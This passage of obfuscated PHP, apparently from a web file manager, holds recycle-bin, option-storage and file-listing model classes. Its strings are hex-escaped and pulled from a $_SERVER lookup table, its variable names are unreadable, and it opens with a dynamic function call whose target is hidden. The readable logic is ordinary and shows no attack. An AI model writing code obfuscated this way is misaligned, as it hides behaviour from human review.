$_act($_SERVER[$_SERVER[ùèÅ´Ãš][1626]]); } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\145\137\x72\x65\143\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\x54\151\155\x65", "\x74\151\155\145", "\x69\156\x73\145\162\164", "\146\x75\156\143\164\151\x6f\156")); public function listData($É•Û”Á™ = false) { $ûèº¥ ã =& $_SERVER[ùèÅ´Ãš]; $É•Û”Á™ = $É•Û”Á™ ? $É•Û”Á™ : USER_ID; $ï×İâí = $this->where(array($ûèº¥ ã[1788] => $É•Û”Á™))->select(); return array_to_keyvalue($ï×İâí, $ûèº¥ ã[12], $ûèº¥ ã[194]); } public function moveToRecycle($ã©€é¿ã) { $‚¹¥Èğï =& $_SERVER[ùèÅ´Ãš]; $£ÇµÄÊ§ = Model($‚¹¥Èğï[1442]); $‘ÇÇœ˜â = $£ÇµÄÊ§->sourceInfo($ã©€é¿ã); if (!$‘ÇÇœ˜â || $‘ÇÇœ˜â[$‚¹¥Èğï[507]] == $‚¹¥Èğï[91]) { return; } $Ï€ÛÁÂ = array($‚¹¥Èğï[493] => $ã©€é¿ã, $‚¹¥Èğï[1788] => USER_ID, $‚¹¥Èğï[655] => $‘ÇÇœ˜â[$‚¹¥Èğï[191]], $‚¹¥Èğï[656] => $‘ÇÇœ˜â[$‚¹¥Èğï[573]], $‚¹¥Èğï[659] => $‘ÇÇœ˜â[$‚¹¥Èğï[588]]); $this->add($Ï€ÛÁÂ); $this->recycleMove($ã©€é¿ã, 1); if ($‘ÇÇœ˜â[$‚¹¥Èğï[487]] == $‚¹¥Èğï[91]) { $Üòş“¥õ = array($‚¹¥Èğï[659] => array($‚¹¥Èğï[619], $‘ÇÇœ˜â[$‚¹¥Èğï[588]] . $ã©€é¿ã . $‚¹¥Èğï[620])); $£ÇµÄÊ§->where($Üòş“¥õ)->setField($‚¹¥Èğï[507], 1); } } public function clear() { $this->remove(!1); } public function remove($ÎÖÃ¬äâ = false, $’¤â Û¤ = false) { $àï‹ÓÔ =& $_SERVER[ùèÅ´Ãš]; $’¤â Û¤ = $’¤â Û¤ ? $’¤â Û¤ : USER_ID; $Â–æœ×Ù = Model($àï‹ÓÔ[1442]); $ğú¨ŞãÅ = $this->listData($’¤â Û¤); $ÎÖÃ¬äâ = $ÎÖÃ¬äâ === !1 ? !1 : $ÎÖÃ¬äâ; $·ğ¨Ï¿É = array(); foreach ($ğú¨ŞãÅ as $ôÂËÜçı) { if ($ÎÖÃ¬äâ != !1 && !in_array($ôÂËÜçı, $ÎÖÃ¬äâ)) { continue; } $ø¥È³ = $Â–æœ×Ù->sourceInfo($ôÂËÜçı); $Â–æœ×Ù->remove($ôÂËÜçı, !1); $ˆì— †ó = $ø¥È³[$àï‹ÓÔ[191]] . $àï‹ÓÔ[11] . $ø¥È³[$àï‹ÓÔ[573]]; $·ğ¨Ï¿É[$ˆì— †ó] = array($àï‹ÓÔ[655] => $ø¥È³[$àï‹ÓÔ[191]], $àï‹ÓÔ[573] => $ø¥È³[$àï‹ÓÔ[573]]); $this->where(array($àï‹ÓÔ[194] => $ôÂËÜçı))->delete(); } foreach ($·ğ¨Ï¿É as $òÆ»ï¯) { $Â–æœ×Ù->targetSpaceUpdate($òÆ»ï¯[$àï‹ÓÔ[191]], $òÆ»ï¯[$àï‹ÓÔ[573]]); } } public function restore($à×‰Â½² = false) { $‡¨ÜÓ°‹ = $this->listData(); $this->_restoreSource($‡¨ÜÓ°‹, $à×‰Â½²); } public function removeUserAll($°¢†ù–«) { $this->remove(!1, $°¢†ù–«); } public function restoreItem($ü Û©¼•) { $this->_restoreSource(array($ü Û©¼•), array($ü Û©¼•)); } private function _restoreSource($Ï²èÆ©…, $êğ’¬ç) { $Åù‰¼ê =& $_SERVER[ùèÅ´Ãš]; $¯Øª×®Ü = Model($Åù‰¼ê[1442]); $êğ’¬ç = $êğ’¬ç == !1 ? !1 : $êğ’¬ç; if (!$Ï²èÆ©…) { return !0; } $€‘è¨» = array(); foreach ($Ï²èÆ©… as $‚¥¯ê…ö) { if ($êğ’¬ç != !1 && !in_array($‚¥¯ê…ö, $êğ’¬ç)) { continue; } $Â‰Âó‰ = $¯Øª×®Ü->sourceInfo($‚¥¯ê…ö); $¶½Ş³‡² = $¯Øª×®Ü->sourceInfo($Â‰Âó‰[$Åù‰¼ê[193]]); if ($¶½Ş³‡²[$Åù‰¼ê[507]] == $Åù‰¼ê[91]) { continue; } $¯Øª×®Ü->lockMoveStart($‚¥¯ê…ö); $this->recycleMove($‚¥¯ê…ö, 0); if ($Â‰Âó‰[$Åù‰¼ê[487]] == $Åù‰¼ê[91]) { $·î­üí¶ = array($Åù‰¼ê[659] => array($Åù‰¼ê[619], $Â‰Âó‰[$Åù‰¼ê[588]] . $‚¥¯ê…ö . $Åù‰¼ê[620])); $¯Øª×®Ü->where($·î­üí¶)->setField($Åù‰¼ê[507], 0); $this->restoreFolderChildren($‚¥¯ê…ö, $Ï²èÆ©…); } $this->where(array($Åù‰¼ê[194] => $‚¥¯ê…ö))->delete(); $¯Øª×®Ü->folderSizeReset($Â‰Âó‰[$Åù‰¼ê[193]]); $€‘è¨»[] = $Â‰Âó‰[$Åù‰¼ê[193]]; if ($Â‰Âó‰[$Åù‰¼ê[487]] == $Åù‰¼ê[91]) { $€‘è¨»[] = $‚¥¯ê…ö; } $¯Øª×®Ü->lockMoveEnd($‚¥¯ê…ö); } $¯Øª×®Ü->updateModifyTime($€‘è¨»); } private function restoreFolderChildren($Å®ÌÄü£, $­æ‰¸ß˜) { $Ú†Š¸¾ =& $_SERVER[ùèÅ´Ãš]; $µ Ù³Èø = Model($Ú†Š¸¾[1442]); $¶Èì±îî = array($Ú†Š¸¾[194] => array($Ú†Š¸¾[7], array())); foreach ($­æ‰¸ß˜ as $ëï¤»ÙÜ) { if ($ëï¤»ÙÜ == $Å®ÌÄü£) { continue; } if (!$µ Ù³Èø->isParentOf($Å®ÌÄü£, $ëï¤»ÙÜ)) { continue; } $¨ÇÈèí” = $µ Ù³Èø->sourceInfo($ëï¤»ÙÜ); if ($¨ÇÈèí”[$Ú†Š¸¾[487]] == $Ú†Š¸¾[91]) { $¶Èì±îî[] = array($Ú†Š¸¾[659] => array($Ú†Š¸¾[619], $¨ÇÈèí”[$Ú†Š¸¾[588]] . $ëï¤»ÙÜ . $Ú†Š¸¾[620])); } else { $¶Èì±îî[$Ú†Š¸¾[194]][1][] = $ëï¤»ÙÜ; } } if (!$¶Èì±îî[$Ú†Š¸¾[194]][1]) { unset($¶Èì±îî[$Ú†Š¸¾[194]]); } if (!$¶Èì±îî) { return; } if (is_array($¶Èì±îî[$Ú†Š¸¾[194]]) && is_array($¶Èì±îî[$Ú†Š¸¾[194]][1])) { $¶Èì±îî[$Ú†Š¸¾[194]][1] = array_unique($¶Èì±îî[$Ú†Š¸¾[194]][1]); } $¶Èì±îî[$Ú†Š¸¾[1088]] = $Ú†Š¸¾[2100]; $µ Ù³Èø->where($¶Èì±îî)->setField($Ú†Š¸¾[507], 1); } private function recycleMove($Æª¶Àšı, $ç³‰· = 1) { $õó«‹‘´ =& $_SERVER[ùèÅ´Ãš]; $¯µ¹ç¤Ö = Model($õó«‹‘´[1442]); $×Ì´İá = Model($õó«‹‘´[2332]); $ƒ÷‹íÖ = array($õó«‹‘´[194] => $Æª¶Àšı); if ($ç³‰·) { $¯µ¹ç¤Ö->where($ƒ÷‹íÖ)->setField($õó«‹‘´[507], 1); $×Ì´İá->eventRecycle($Æª¶Àšı, $õó«‹‘´[2333]); } else { $öÈ§â…¯ = $¯µ¹ç¤Ö->where($ƒ÷‹íÖ)->find(); $êë •ÀÁ = $öÈ§â…¯[$õó«‹‘´[487]] == $õó«‹‘´[91]; $ªúì¢õç = $¯µ¹ç¤Ö->fileNameAuto($öÈ§â…¯[$õó«‹‘´[193]], $öÈ§â…¯[$õó«‹‘´[32]], REPEAT_RENAME_FOLDER, $êë •ÀÁ); if ($ªúì¢õç != $öÈ§â…¯[$õó«‹‘´[32]]) { $¯µ¹ç¤Ö->rename($Æª¶Àšı, $ªúì¢õç); } $¯µ¹ç¤Ö->where($ƒ÷‹íÖ)->setField($õó«‹‘´[507], 0); $×Ì´İá->eventRecycle($Æª¶Àšı, $õó«‹‘´[2334]); } } } goto CĞâ…ª÷ŸÜ; A‘Ã¬’©Š : class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\155\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($ËÌÅË³á = false, $´˜©·É’ = "\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\145", $£¾‰‹™ö = false) { $íä‡õ®Ô = Model($this->modelType)->get(!1, $this->optionType, !0); $ªŸ“£“– = array_values($íä‡õ®Ô); if ($ªŸ“£“– && $ªŸ“£“–[0] && !is_array($ªŸ“£“–[0])) { Model($this->modelType)->cacheRemove($this->optionType); $íä‡õ®Ô = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$íä‡õ®Ô) { return $ËÌÅË³á ? null : array(); } if (!$ËÌÅË³á) { $íä‡õ®Ô = array_filter(array_values($íä‡õ®Ô)); return array_sort_by($íä‡õ®Ô, $´˜©·É’, $£¾‰‹™ö); } return $íä‡õ®Ô[$_SERVER[ùèÅ´Ãš][474] . $ËÌÅË³á]; } public function insert($ÜÜ…­ìõ) { $îüÙÖæÂ =& $_SERVER[ùèÅ´Ãš]; $ÜÜ…­ìõ = array_field_key($ÜÜ…­ìõ, $this->field); $¾Ìõ”ß = Model($this->modelType)->get($îüÙÖæÂ[475], $this->optionType . $îüÙÖæÂ[476]); $¾Ìõ”ß = $¾Ìõ”ß ? $¾Ìõ”ß : 0; $ÜÜ…­ìõ[$îüÙÖæÂ[477]] = ++$¾Ìõ”ß; $ÜÜ…­ìõ[$îüÙÖæÂ[234]] = time(); $ÜÜ…­ìõ[$îüÙÖæÂ[88]] = time(); Model($this->modelType)->set($îüÙÖæÂ[475], $¾Ìõ”ß, $this->optionType . $îüÙÖæÂ[476]); Model($this->modelType)->set($îüÙÖæÂ[474] . $¾Ìõ”ß, $ÜÜ…­ìõ, $this->optionType); return $¾Ìõ”ß; } public function update($ôõ«ª§ı, $¤†«Îë‹) { $ãİ²áûš =& $_SERVER[ùèÅ´Ãš]; $¤†«Îë‹ = array_field_key($¤†«Îë‹, $this->field); $Üó…çÈ = $this->listData($ôõ«ª§ı); if (!$Üó…çÈ || !$ôõ«ª§ı) { return !1; } $¤†«Îë‹ = array_merge($Üó…çÈ, $¤†«Îë‹); $¤†«Îë‹[$ãİ²áûš[88]] = time(); return Model($this->modelType)->set($ãİ²áûš[474] . $ôõ«ª§ı, $¤†«Îë‹, $this->optionType); } public function remove($õ°•ÎÏ²) { if (!$õ°•ÎÏ²) { return !1; } return Model($this->modelType)->remove($_SERVER[ùèÅ´Ãš][474] . $õ°•ÎÏ², $this->optionType); } public function clear() { $ ¡¢õ» =& $_SERVER[ùèÅ´Ãš]; Model($this->modelType)->remove($ ¡¢õ»[475], $this->optionType . $ ¡¢õ»[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¶Í‘¤Æ‹, $¶‚ãŸÛÄ) { if (!$¶‚ãŸÛÄ) { return !1; } $ã Â·ŠÅ = $this->listData(); $ã Â·ŠÅ = array_to_keyvalue($ã Â·ŠÅ, $¶Í‘¤Æ‹); return isset($ã Â·ŠÅ[$¶‚ãŸÛÄ]) ? $ã Â·ŠÅ[$¶‚ãŸÛÄ] : !1; } public function findByName($¤àÃ«ÏØ) { return $this->findByKey($_SERVER[ùèÅ´Ãš][32], $¤àÃ«ÏØ); } protected function resetData($…ÖÅ®Èº) { $²ãü™ö =& $_SERVER[ùèÅ´Ãš]; $…ÖÅ®Èº = is_array($…ÖÅ®Èº) ? $…ÖÅ®Èº : array(); $ÎÕ‹ÊÃÄ = array(); for ($­ã‚‰º• = 0; $­ã‚‰º• < count($…ÖÅ®Èº); $­ã‚‰º•++) { $ÎÕ‹ÊÃÄ[$²ãü™ö[474] . $…ÖÅ®Èº[$­ã‚‰º•][$²ãü™ö[477]]] = $…ÖÅ®Èº[$­ã‚‰º•]; } return Model($this->modelType)->set($ÎÕ‹ÊÃÄ, !1, $this->optionType); } private function getAutoName($óù¤è) { $¾§şÑë = array_to_keyvalue($this->listData(), $_SERVER[ùèÅ´Ãš][32]); if (!$¾§şÑë || !isset($¾§şÑë[$óù¤è])) { return $óù¤è; } for ($±ıƒ¨¾ü = 1; $±ıƒ¨¾ü < count($¾§şÑë); $±ıƒ¨¾ü++) { $¿æ­èí£ = $óù¤è . "\50{$±ıƒ¨¾ü}\x29"; if (!isset($¾§şÑë[$¿æ­èí£])) { return $¿æ­èí£; } } return $¿æ­èí£; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ûİƒ†‘‰ = false, $Î¼–å‹ = '', $¶Äœõ‡ = false) { $¯·İŠªó =& $_SERVER[ùèÅ´Ãš]; $¤´¤¼­à = $this->cacheGet($Î¼–å‹); $Ú”Ïç¥ = $this->optionDefault($Î¼–å‹); $Ú”Ïç¥ = is_array($Ú”Ïç¥) ? $Ú”Ïç¥ : array(); if (is_array($¤´¤¼­à)) { $¤´¤¼­à = array_merge($Ú”Ïç¥, $¤´¤¼­à); return $Ûİƒ†‘‰ ? isset($¤´¤¼­à[$Ûİƒ†‘‰]) ? $¤´¤¼­à[$Ûİƒ†‘‰] : null : $¤´¤¼­à; } $¼Ë¡³¡ü = $this->filterWhere(array($¯·İŠªó[33] => $Î¼–å‹)); $¤´¤¼­à = $this->where($¼Ë¡³¡ü)->select(); $¤´¤¼­à = array_to_keyvalue($¤´¤¼­à, $¯·İŠªó[97], $¯·İŠªó[452]); foreach ($¤´¤¼­à as $ß™´ó¶× => $¾õÚŒ‡µ) { if ($¶Äœõ‡ || in_array($ß™´ó¶×, $this->jsonField)) { $¤´¤¼­à[$ß™´ó¶×] = json_decode($¾õÚŒ‡µ, !0); } } $this->cacheSet($Î¼–å‹, $¤´¤¼­à); $¤´¤¼­à = array_merge($Ú”Ïç¥, $¤´¤¼­à); return $Ûİƒ†‘‰ ? $¤´¤¼­à[$Ûİƒ†‘‰] : $¤´¤¼­à; } public function set($Àê èµÈ, $¸µ÷ÏóÀ = false, $Š†õ‚­ = '') { $õ™Ê  =& $_SERVER[ùèÅ´Ãš]; $this->cacheRemove($Š†õ‚­); $ğ˜İª‹ = array(); $´ß…”Ôœ = is_array($Àê èµÈ) ? $Àê èµÈ : array($Àê èµÈ => $¸µ÷ÏóÀ); foreach ($´ß…”Ôœ as $š›¹äÄ³ => $üİ´ÑÂ) { if (is_array($üİ´ÑÂ)) { $üİ´ÑÂ = json_encode_force($üİ´ÑÂ); } $this->checkLength($üİ´ÑÂ, !1, $this->tableName . $õ™Ê [4] . $Àê èµÈ); $üİ´ÑÂ = self::textEncode($üİ´ÑÂ); $´ß…”Ôœ = array($õ™Ê [33] => $Š†õ‚­, $õ™Ê [97] => $š›¹äÄ³, $õ™Ê [452] => $üİ´ÑÂ); $ğ˜İª‹[] = $this->filterWhere($´ß…”Ôœ); } if (!$ğ˜İª‹) { return !0; } $•ˆ³ŠŒó = $this->cacheKey($õ™Ê [478]); CacheLock::lock($•ˆ³ŠŒó); $ŸŸê­… = $this->addAll($ğ˜İª‹, array(), !0); CacheLock::unlock($•ˆ³ŠŒó); return $ŸŸê­…; } protected function optionDefault($‡İ“Ÿ”Ä = '') { return !1; } public function setDeep($ßñë¬¸‚, $’ŠÙìç = false, $­Ÿ¥€ç‘ = '') { $Œ¨–¤÷ = explode($_SERVER[ùèÅ´Ãš][10], $ßñë¬¸‚); $±ôÌİò„ = $this->get(); array_set_value($±ôÌİò„, $ßñë¬¸‚, $’ŠÙìç); $this->set($Œ¨–¤÷[0], $±ôÌİò„[$Œ¨–¤÷[0]], $­Ÿ¥€ç‘); } public function remove($—ÈÁ¶ü, $ˆˆè¾ÉÊ = '') { $úè¥–û =& $_SERVER[ùèÅ´Ãš]; $this->cacheRemove($ˆˆè¾ÉÊ); $Æ¤¨¿ş = $this->filterWhere(array($úè¥–û[97] => $—ÈÁ¶ü, $úè¥–û[33] => $ˆˆè¾ÉÊ)); if (is_null($—ÈÁ¶ü)) { unset($Æ¤¨¿ş[$úè¥–û[97]]); } return $this->where($Æ¤¨¿ş)->delete(); } public function cacheSet($¼¤É‚•Å, $²ÏÆêªÖ = false) { return Cache::set($this->cacheKey($¼¤É‚•Å), $²ÏÆêªÖ); } public function cacheGet($²†åçïé) { return Cache::get($this->cacheKey($²†åçïé)); } public function cacheRemove($ãóı²¢) { return Cache::remove($this->cacheKey($ãóı²¢)); } protected function filterWhere($Àœ æ‘¢) { return $Àœ æ‘¢; } protected function cacheKey($é”€æà) { return $é”€æà; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\141\155\145" => "\151\x6f\x5f\163\x6f\x75\162\143\145\x5f\155\x65\x74\141", "\155\x65\164\141\x46\151\145\x6c\x64" => "\163\157\x75\x72\x63\145\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\124\151\155\x65", "\164\151\155\x65", "\151\156\163\x65\x72\164", "\x66\x75\156\143\164\x69\157\x6e"), array("\143\162\x65\141\x74\145\x54\151\x6d\145", "\164\151\155\x65", "\x69\x6e\163\x65\162\x74", "\146\x75\156\143\x74\x69\x6f\156"), array("\x76\x69\145\167\x54\x69\x6d\145", "\x74\151\155\x65", "\151\156\163\145\162\x74", "\146\x75\x6e\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($şõÈ­¶ú) { return $this->listSource(array($_SERVER[ùèÅ´Ãš][479] => $şõÈ­¶ú)); } public function typeName($êûƒ®˜›) { static $Ë­÷ó¦Í = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\x6d", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\x72\157\165\160"); return $Ë­÷ó¦Í[$êûƒ®˜› . $_SERVER[ùèÅ´Ãš][12]]; } public function sourceListInfo($š’ÇôÖù, $åÏ¢ßé¿ = false) { $åò¢ßÈú =& $_SERVER[ùèÅ´Ãš]; $š’ÇôÖù = $š’ÇôÖù ? $š’ÇôÖù : array(); $š’ÇôÖù = array_filter(array_unique($š’ÇôÖù)); if (!$š’ÇôÖù) { return array(); } $‹˜ñ‚œó = $this->where(array($åò¢ßÈú[194] => array($åò¢ßÈú[7], $š’ÇôÖù)))->select(); $this->_listDataApply($‹˜ñ‚œó, $åÏ¢ßé¿); return array_to_keyvalue($‹˜ñ‚œó, $åò¢ßÈú[194]); } public function pathInfoFilter(&$£âá„ ) { $àİ‹Ã‘Û =& $_SERVER[ùèÅ´Ãš]; static $ ¿Á½ô = false; static $¾÷¢Ø“ô = false; static $·°„Îİ = false; if (!$ ¿Á½ô) { $Á£ßšÈÁ = $àİ‹Ã‘Û[480]; $Á£ßšÈÁ .= $àİ‹Ã‘Û[481]; $Á£ßšÈÁ .= $àİ‹Ã‘Û[482]; $ôÚë™Ù¾ = $àİ‹Ã‘Û[483]; $«…Ñ„ö… = explode($àİ‹Ã‘Û[50], $ôÚë™Ù¾); $ ¿Á½ô = explode($àİ‹Ã‘Û[50], $Á£ßšÈÁ); $¾÷¢Ø“ô = array(); foreach ($ ¿Á½ô as $˜“¡‡ŸÂ) { if (in_array($˜“¡‡ŸÂ, $«…Ñ„ö…)) { continue; } $¾÷¢Ø“ô[] = $˜“¡‡ŸÂ; } $·°„Îİ = explode($àİ‹Ã‘Û[50], $àİ‹Ã‘Û[484]); } foreach ($·°„Îİ as $±¢¬€ÁÇ) { if (isset($£âá„ [$±¢¬€ÁÇ])) { $£âá„ [$±¢¬€ÁÇ] = intval($£âá„ [$±¢¬€ÁÇ]); } } $£âá„ [$àİ‹Ã‘Û[87]] = $àİ‹Ã‘Û[485] . $£âá„ [$àİ‹Ã‘Û[194]] . $àİ‹Ã‘Û[486]; $£âá„ [$àİ‹Ã‘Û[33]] = $£âá„ [$àİ‹Ã‘Û[487]] == 1 ? $àİ‹Ã‘Û[78] : $àİ‹Ã‘Û[233]; $£âá„ [$àİ‹Ã‘Û[191]] = $this->typeName($£âá„ [$àİ‹Ã‘Û[191]]); if ($£âá„ [$àİ‹Ã‘Û[487]] != 1) { $£âá„ [$àİ‹Ã‘Û[169]] = $£âá„ [$àİ‹Ã‘Û[488]]; unset($£âá„ [$àİ‹Ã‘Û[488]]); } $×ˆŸ¨óÇ = $ ¿Á½ô; if (isset($£âá„ [$àİ‹Ã‘Û[489]]) && $£âá„ [$àİ‹Ã‘Û[489]][$àİ‹Ã‘Û[490]] == -1) { $×ˆŸ¨óÇ = $¾÷¢Ø“ô; } $£âá„  = array_field_key($£âá„ , $×ˆŸ¨óÇ); return $£âá„ ; } public function listUserFav() { $Ÿä™ãÙ =& $_SERVER[ùèÅ´Ãš]; $ §¨ÌÆ¨ = Model($Ÿä™ãÙ[491])->listData(); $ºç•×ı¡ = array_filter_by_field($ §¨ÌÆ¨, $Ÿä™ãÙ[33], $Ÿä™ãÙ[492]); $ºç•×ı¡ = array_to_keyvalue($ºç•×ı¡, $Ÿä™ãÙ[12], $Ÿä™ãÙ[87]); if ($ºç•×ı¡) { $ıÚ¸å‚¿ = $this->listSource(array($Ÿä™ãÙ[493] => array($Ÿä™ãÙ[494], $ºç•×ı¡))); } $ıÚ¸å‚¿ = array_to_keyvalue($ıÚ¸å‚¿[$Ÿä™ãÙ[447]], $Ÿä™ãÙ[194]); foreach ($ §¨ÌÆ¨ as &$Ç´ÏË«) { $Ç´ÏË« = array($Ÿä™ãÙ[495] => $Ç´ÏË«[$Ÿä™ãÙ[477]], $Ÿä™ãÙ[496] => $Ç´ÏË«[$Ÿä™ãÙ[32]], $Ÿä™ãÙ[497] => $Ç´ÏË«[$Ÿä™ãÙ[87]], $Ÿä™ãÙ[498] => $Ç´ÏË«[$Ÿä™ãÙ[33]], $Ÿä™ãÙ[499] => $Ç´ÏË«[$Ÿä™ãÙ[234]], $Ÿä™ãÙ[500] => $Ç´ÏË«[$Ÿä™ãÙ[88]]); if ($Ç´ÏË«[$Ÿä™ãÙ[33]] == $Ÿä™ãÙ[492] && $ıÚ¸å‚¿[$Ç´ÏË«[$Ÿä™ãÙ[87]]]) { $Ç´ÏË«[$Ÿä™ãÙ[90]] = $ıÚ¸å‚¿[$Ç´ÏË«[$Ÿä™ãÙ[87]]]; } } unset($Ç´ÏË«); return $ §¨ÌÆ¨; } public function listUserTag($ÏÁùµîš) { $ö€Êñ£¹ =& $_SERVER[ùèÅ´Ãš]; if ($ÏÁùµîš && !is_array($ÏÁùµîš)) { $ÏÁùµîš = array($ÏÁùµîš); } $‡œ¥¤›¬ = Model($ö€Êñ£¹[501])->listData(); $ïƒÇÙ·Ü = array(); $Ÿî£É¤£ = array(); foreach ($‡œ¥¤›¬ as $¢ùıœØ„) { $şÈøßö = $¢ùıœØ„[$ö€Êñ£¹[87]]; if (!$şÈøßö) { continue; } if (!isset($Ÿî£É¤£[$şÈøßö])) { $Ÿî£É¤£[$şÈøßö] = array(); } $Ÿî£É¤£[$şÈøßö][] = $¢ùıœØ„[$ö€Êñ£¹[502]]; $ïƒÇÙ·Ü[$¢ùıœØ„[$ö€Êñ£¹[87]]] = $¢ùıœØ„; } $æş’ˆù = array(); $ÌæÓˆ¼ = array(); $Ìãú¿ŸÅ = array(); foreach ($Ÿî£É¤£ as $šàÒÍµ => $Ù§Á’Ø’) { $ Œà™ª = !0; if (!$ÏÁùµîš) { $æş’ˆù[] = $šàÒÍµ; continue; } foreach ($ÏÁùµîš as $ô×¹«Ù) { if (!in_array($ô×¹«Ù, $Ù§Á’Ø’)) { $ Œà™ª = !1; break; } } if (!$ Œà™ª) { continue; } if (!is_numeric($šàÒÍµ)) { $Ñ©ö¤±ş = $ïƒÇÙ·Ü[$šàÒÍµ]; $Äå£‹»Å = array($ö€Êñ£¹[32] => $Ñ©ö¤±ş[$ö€Êñ£¹[32]], $ö€Êñ£¹[87] => $Ñ©ö¤±ş[$ö€Êñ£¹[87]], $ö€Êñ£¹[33] => $Ñ©ö¤±ş[$ö€Êñ£¹[33]], $ö€Êñ£¹[90] => array($ö€Êñ£¹[503] => 1), $ö€Êñ£¹[235] => !0); if ($Ñ©ö¤±ş[$ö€Êñ£¹[33]] == $ö€Êñ£¹[233]) { $Ìãú¿ŸÅ[] = $Äå£‹»Å; } if ($Ñ©ö¤±ş[$ö€Êñ£¹[33]] == $ö€Êñ£¹[78]) { $ÌæÓˆ¼[] = $Äå£‹»Å; } continue; } $æş’ˆù[] = $šàÒÍµ; } if ($æş’ˆù) { $öŸò¦´ = $this->listSource(array($ö€Êñ£¹[493] => array($ö€Êñ£¹[494], $æş’ˆù))); } $öŸò¦´ = $öŸò¦´ ? $öŸò¦´ : array($ö€Êñ£¹[85] => array(), $ö€Êñ£¹[86] => array()); $öŸò¦´[$ö€Êñ£¹[85]] = array_merge($öŸò¦´[$ö€Êñ£¹[85]], $ÌæÓˆ¼); $öŸò¦´[$ö€Êñ£¹[86]] = array_merge($öŸò¦´[$ö€Êñ£¹[86]], $Ìãú¿ŸÅ); if (isset($öŸò¦´[$ö€Êñ£¹[444]]) && count($æş’ˆù) == $öŸò¦´[$ö€Êñ£¹[444]][$ö€Êñ£¹[445]]) { return $öŸò¦´; } $Ç‰ß²§ = array(); $÷³¾´‚³ = array_to_keyvalue($öŸò¦´[$ö€Êñ£¹[85]], $ö€Êñ£¹[12], $ö€Êñ£¹[194]); $Â‚èÖüŠ = array_to_keyvalue($öŸò¦´[$ö€Êñ£¹[86]], $ö€Êñ£¹[12], $ö€Êñ£¹[194]); $×°ˆÂô = array_merge($Â‚èÖüŠ, $÷³¾´‚³); foreach ($æş’ˆù as $şÈøßö) { if (!in_array($şÈøßö, $×°ˆÂô)) { $Ç‰ß²§[] = $şÈøßö; } } if ($Ç‰ß²§) { Model($ö€Êñ£¹[504])->removeBySource($Ç‰ß²§); } return $öŸò¦´; } public function listUserRecycle() { $ã¦“µôƒ =& $_SERVER[ùèÅ´Ãš]; $¬­¨¥ÎÒ = Model($ã¦“µôƒ[505])->listData(); if (!$¬­¨¥ÎÒ) { return array(); } $ëÇÓĞïÔ = array($ã¦“µôƒ[493] => array($ã¦“µôƒ[494], $¬­¨¥ÎÒ), $ã¦“µôƒ[506] => 1); return $this->listSource($ëÇÓĞïÔ); } public function listSource($ı†„üİı, $ßõÄ„íê = 3000, $¹âËÂÑ = false) { $Ùì¬¸âù =& $_SERVER[ùèÅ´Ãš]; if (!isset($ı†„üİı[$Ùì¬¸âù[507]])) { $ı†„üİı[$Ùì¬¸âù[507]] = 0; } if (isset($ı†„üİı[$Ùì¬¸âù[193]]) && $ı†„üİı[$Ùì¬¸âù[193]] == $Ùì¬¸âù[231]) { $ı†„üİı[$Ùì¬¸âù[488]] = array($Ùì¬¸âù[508], $Ùì¬¸âù[12]); } if (isset($ı†„üİı[$Ùì¬¸âù[193]])) { $ı†„üİı[$Ùì¬¸âù[193]] = intval($ı†„üİı[$Ùì¬¸âù[193]]); } $Ù åÌÑ = $Ùì¬¸âù[509]; $Ó‚©´Á = $this->field($Ù åÌÑ)->_makeOrder()->where($ı†„üİı)->selectPage($ßõÄ„íê); $this->_listPageCheck($Ó‚©´Á, $Ù åÌÑ, $ı†„üİı); $this->_listDataApply($Ó‚©´Á[$Ùì¬¸âù[447]], $¹âËÂÑ); $this->_listMake($Ó‚©´Á); return $Ó‚©´Á; } private function _listPageCheck(&$£³²òí, $‘Üì÷ûù, $çµ‰Âî) { $Ì¸°˜° =& $_SERVER[ùèÅ´Ãš]; if (!is_array($£³²òí[$Ì¸°˜°[444]])) { return; } $›¨ïÊÄº = $£³²òí[$Ì¸°˜°[444]]; if ($›¨ïÊÄº[$Ì¸°˜°[446]] <= 1) { return; } if ($›¨ïÊÄº[$Ì¸°˜°[445]] >= 100000) { return; } if (Model($Ì¸°˜°[510])->get($Ì¸°˜°[511]) != $Ì¸°˜°[512]) { return; } $‘Üì÷ûù = str_replace(array($Ì¸°˜°[53], $Ì¸°˜°[419], $Ì¸°˜°[288]), $Ì¸°˜°[12], $‘Üì÷ûù); $‘Üì÷ûù = $Ì¸°˜°[513] . str_replace($Ì¸°˜°[50], $Ì¸°˜°[514], $‘Üì÷ûù) . $Ì¸°˜°[515]; $Òƒ”±¯ = $Ì¸°˜°[516]; $Òƒ”±¯ = $Òƒ”±¯ . $Ì¸°˜°[517]; $ª¤Ã³Âº = $›¨ïÊÄº[$Ì¸°˜°[441]] * ($›¨ïÊÄº[$Ì¸°˜°[430]] - 1) . $Ì¸°˜°[50] . $›¨ïÊÄº[$Ì¸°˜°[441]]; $ı°ÔîÅ¹ = $this->_makeOrder(!0); $Å‘÷¼–² = $Ì¸°˜°[513] . str_replace($Ì¸°˜°[50], $Ì¸°˜°[514], $ı°ÔîÅ¹[0]); if (strpos($Å‘÷¼–², $Ì¸°˜°[518])) { $Å‘÷¼–² = str_replace($Ì¸°˜°[518], $Ì¸°˜°[519], $Å‘÷¼–²); } else { $Å‘÷¼–² .= $Ì¸°˜°[520] . $ı°ÔîÅ¹[1]; } $ö¤–ïää = array(); foreach ($çµ‰Âî as $×¶ŠÑÚÄ => $Ä¦œˆ¹Í) { 